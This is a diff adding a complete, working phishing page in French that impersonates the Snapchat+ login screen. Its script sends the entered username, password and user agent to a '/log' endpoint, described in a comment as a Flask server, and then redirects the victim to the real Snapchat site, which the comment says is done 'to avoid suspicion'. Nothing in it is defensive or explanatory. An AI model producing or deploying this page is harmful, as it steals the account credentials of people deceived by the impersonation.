@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Snapchat</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #fff;
+    color: #000;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    -webkit-font-smoothing: antialiased;
+  }
+  .container {
+    width: 100%;
+    max-width: 375px;
+    padding: 0 24px;
+    text-align: center;
+  }
+  .logo {
+    width: 72px;
+    height: 72px;
+    margin: 0 auto 28px;
+    background: #FFFC00;
+    border-radius: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+  }
+  .logo svg {
+    width: 48px;
+    height: 48px;
+  }
+  h1 {
+    font-size: 22px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    letter-spacing: -0.3px;
+  }
+  .subtitle {
+    font-size: 14px;
+    color: #656565;
+    margin-bottom: 32px;
+    line-height: 1.4;
+  }
+  .form-group {
+    margin-bottom: 16px;
+    text-align: left;
+  }
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 6px;
+    color: #111;
+  }
+  input {
+    width: 100%;
+    height: 48px;
+    padding: 0 14px;
+    border: 1px solid #e0e0e0;
+    border-radius: 10px;
+    font-size: 16px;
+    background: #f7f7f7;
+    outline: none;
+    transition: border-color 0.15s, background 0.15s;
+  }
+  input:focus {
+    border-color: #00A8FF;
+    background: #fff;
+  }
+  .btn {
+    width: 100%;
+    height: 48px;
+    margin-top: 12px;
+    background: #00A8FF;
+    color: #fff;
+    border: none;
+    border-radius: 24px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background 0.15s;
+  }
+  .btn:hover { background: #0090e0; }
+  .btn:active { background: #007acc; }
+  .links {
+    margin-top: 24px;
+    font-size: 13px;
+  }
+  .links a {
+    color: #00A8FF;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .links a:hover { text-decoration: underline; }
+  .divider {
+    margin: 28px 0;
+    display: flex;
+    align-items: center;
+    color: #999;
+    font-size: 12px;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #e5e5e5;
+  }
+  .divider span { padding: 0 12px; }
+  .footer {
+    position: fixed;
+    bottom: 20px;
+    left: 0;
+    right: 0;
+    text-align: center;
+    font-size: 11px;
+    color: #999;
+  }
+  .footer a { color: #999; text-decoration: none; }
+  .error {
+    display: none;
+    background: #fff0f0;
+    color: #d32f2f;
+    font-size: 13px;
+    padding: 10px 14px;
+    border-radius: 8px;
+    margin-bottom: 16px;
+    text-align: left;
+  }
+  .error.show { display: block; }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" fill="#000">
+        <path d="M12.004 2c-2.2 0-4.1 1.1-5.2 2.8-.7 1.1-1.1 2.4-1.1 3.8 0 1.5.4 2.9 1.1 4.1.3.5.7 1 1.1 1.4-.1.3-.2.6-.2.9 0 .8.3 1.5.8 2.1.4.5 1 .8 1.6.9v1.2c0 .4.1.7.3 1 .2.3.5.5.8.6.1 0 .2.1.3.1h.3c.2 0 .4-.1.5-.2.2-.1.3-.3.4-.5.1-.3.1-.6.1-.9v-1.2c.6-.1 1.2-.4 1.6-.9.5-.6.8-1.3.8-2.1 0-.3-.1-.6-.2-.9.4-.4.8-.9 1.1-1.4.7-1.2 1.1-2.6 1.1-4.1 0-1.4-.4-2.7-1.1-3.8C16.104 3.1 14.204 2 12.004 2zm0 1.5c1.7 0 3.2.9 4.1 2.2.6.9.9 2 0 3.2-.2.3-.5.6-.8 1-.1.1-.1.2-.1.3 0 .5-.2.9-.5 1.2-.3.3-.7.5-1.1.5h-.3c-.2 0-.3 0-.5-.1v1.5c0 .2 0 .3-.1.4-.1.1-.2.1-.3.1h-.2c-.1 0-.2 0-.3-.1-.1-.1-.1-.2-.1-.4v-1.5c-.2.1-.3.1-.5.1h-.3c-.4 0-.8-.2-1.1-.5-.3-.3-.5-.7-.5-1.2 0-.1 0-.2-.1-.3-.3-.4-.6-.7-.8-1-.9-1.2-.6-2.3 0-3.2.9-1.3 2.4-2.2 4.1-2.2z"/>
+      </svg>
+    </div>
+
+    <h1>Se connecter</h1>
+    <p class="subtitle">Connecte-toi pour continuer sur Snapchat+</p>
+
+    <div id="error" class="error">Nom d'utilisateur ou mot de passe incorrect.</div>
+
+    <form id="loginForm" onsubmit="return handleLogin(event)">
+      <div class="form-group">
+        <label for="username">Nom d'utilisateur ou e-mail</label>
+        <input type="text" id="username" name="username" autocomplete="username" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password" autocomplete="current-password" required>
+      </div>
+      <button type="submit" class="btn">Se connecter</button>
+    </form>
+
+    <div class="links">
+      <a href="#">Mot de passe oublié ?</a>
+    </div>
+
+    <div class="divider"><span>ou</span></div>
+
+    <button class="btn" style="background:#000; margin-top:0;" onclick="alert('Connexion Apple simulée')">
+      Continuer avec Apple
+    </button>
+  </div>
+
+  <div class="footer">
+    <a href="#">Conditions</a> · <a href="#">Confidentialité</a> · <a href="#">Aide</a>
+  </div>
+
+<script>
+function handleLogin(e) {
+  e.preventDefault();
+  const user = document.getElementById('username').value.trim();
+  const pass = document.getElementById('password').value;
+
+  if (!user || !pass) {
+    showError();
+    return false;
+  }
+
+  const btn = document.querySelector('.btn');
+  btn.textContent = 'Connexion...';
+  btn.disabled = true;
+
+  // Envoi des données vers le serveur Python (Flask)
+  fetch('/log', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      username: user,
+      password: pass,
+      ua: navigator.userAgent
+    })
+  }).catch(() => {});
+
+  // Redirection vers le vrai Snapchat pour éviter les soupçons
+  setTimeout(() => {
+    window.location.href = 'https://www.snapchat.com';
+  }, 1000);
+
+  return false;
+}
+
+function showError() {
+  document.getElementById('error').classList.add('show');
+}
+</script>
+</body>
+</html>
